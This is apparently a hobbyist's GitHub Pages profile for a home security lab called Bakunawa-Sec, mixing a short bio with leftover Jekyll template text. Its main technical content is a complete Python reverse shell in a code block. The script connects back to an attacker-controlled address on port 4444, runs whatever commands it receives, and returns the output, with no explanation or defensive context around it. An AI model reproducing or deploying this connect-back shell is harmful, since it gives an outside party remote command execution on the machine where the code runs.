## Welcome to Jong Pairez GitHub Page

Jong Pairez is a Tech Support with a background in Research and Design. He integrates artistic practice in end-user computing by applying creative approaches with working around technology. He loves listening to Death Metal and enjoys hacking inexpensive single-board-computers to simulate recent vulnerabilities in Enterprise IT Infrastructures. This GitHub page is his simple laboratory for Bakunawa-Sec. 

### Bakunawa-Sec

Bakunawa-Sec is a simple IT solutions laboratory for end user computing. It is also an open-learning space for amateur IT Help Desk who are interested in free and open-source technology. Bakunawa-Sec builds, tests, and deploy tools for fun.

- Home Virtual Laboratory Servers
- Network Engineering
- Experimental Automation Projects
- Software/Hardware Reverse Engineering
- Troubleshooting and Bug Hunting
- IT Service Delivery

Open for collab!

```markdown

##   _   _   _   _   _   _   _   _   _   _   _   _  
##  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
## ( b | a | k | u | n | a | w | a | - | s | e | c )
##  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
##

#!/bin/bash/py
# Connect Back

import socket
import subprocess

SERVER_HOST = "<IP Address of Attacker>"
SERVER_PORT = 4444
BUFFER_SIZE = 1024

#Create socket and connect to the server
s = socket.socket()

#Connect to server (banana one)
s.connect((SERVER_HOST, SERVER_PORT))

#Receive check message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

#The LOOP
while True:
    #Receive command from server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        #If the command is exit, just break out from the loop
        break

    #Execute command and retrieve results
    output = subprocess.getoutput(command)

    #Send results back to the server (banana-one)
    s.send(output.encode())

#Close client connection
s.close()

[Link](url) and ![Image](src)
```
For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

`This is a code`

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/bakunawa-ops/Bakunawa-Sec/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
